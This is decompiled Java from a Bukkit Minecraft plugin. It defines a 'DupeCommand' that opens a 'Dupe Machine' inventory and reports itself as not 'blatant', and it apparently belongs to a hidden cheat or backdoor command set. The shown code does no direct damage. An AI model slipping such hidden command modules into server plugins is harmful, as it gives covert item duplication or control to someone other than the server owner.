/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.Inventory
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.Plugin;

public class DupeCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> {
            Inventory inv = Bukkit.createInventory(null, (int)27, (String)(Settings.RED + ">> " + Settings.NAME + " Dupe Machine"));
            plugin.inventories.add(inv);
            p2.openInventory(inv);
        });
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

